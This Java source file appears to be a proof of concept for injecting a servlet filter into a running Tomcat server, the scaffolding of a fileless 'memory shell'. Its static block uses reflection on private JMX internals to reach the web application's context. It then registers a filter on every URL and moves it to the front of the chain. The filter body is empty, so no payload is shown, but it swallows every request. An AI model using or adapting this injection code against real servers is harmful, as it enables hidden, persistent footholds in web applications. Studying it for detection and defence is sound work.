package com.reinject.test;

import com.sun.jmx.mbeanserver.NamedObject;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.deploy.FilterDef;
import org.apache.catalina.deploy.FilterMap;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class TestAddFilter implements Filter {

    private final static String filterName = "xxx";
    private final static String filterUrlPattern = "/*";

    static {
        StandardContext standardContext = null;
        try {
            MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
            // 获取mbsInterceptor
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object mbsInterceptor = field.get(mBeanServer);
            // 获取repository
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Object repository = field.get(mbsInterceptor);
            // 获取domainTb
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap<String, Map<String, NamedObject>> domainTb = (HashMap<String,Map<String,NamedObject>>)field.get(repository);
            // 获取domain
            NamedObject nonLoginAuthenticator = domainTb.get("Catalina").get("context=/,host=localhost,name=NonLoginAuthenticator,type=Valve");
            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            Object object = field.get(nonLoginAuthenticator);
            // 获取resource
            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            Object resource = field.get(object);
            // 获取context
            field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
            field.setAccessible(true);
            standardContext = (StandardContext) field.get(resource);
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        // Define
        StandardContext context = standardContext;
        FilterMap filterMap = new FilterMap();
        FilterDef filterDef = context.findFilterDef(filterName);
        Filter filter = new TestAddFilter();
        // filterDef
        if (filterDef == null) {
            // Gen filterDef
            filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(filter.getClass().getName());
            filterDef.setFilter(filter);
            // Add filterDef
            context.addFilterDef(filterDef);
            // Refresh filterConfigs
            context.filterStart();
        }
        // filterMap
        filterMap.setFilterName(filterName);
        filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));
        filterMap.addURLPattern(filterUrlPattern);
        context.addFilterMap(filterMap);
        // Order
        Object[] filterMaps = context.findFilterMaps();
        Object[] tmpFilterMaps = new Object[filterMaps.length];
        int index = 1;
        for (int i = 0; i < filterMaps.length; i++)
        {
            FilterMap f = (FilterMap) filterMaps[i];
            if (f.getFilterName().equalsIgnoreCase(filterName)) {
                tmpFilterMaps[0] = f;
            } else {
                tmpFilterMaps[index++] = f;
            }
        }
        for (int i = 0; i < filterMaps.length; i++) {
            filterMaps[i] = tmpFilterMaps[i];
        }
        System.out.println("Test Add Filter................");
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {

    }

    @Override
    public void destroy() {

    }
}
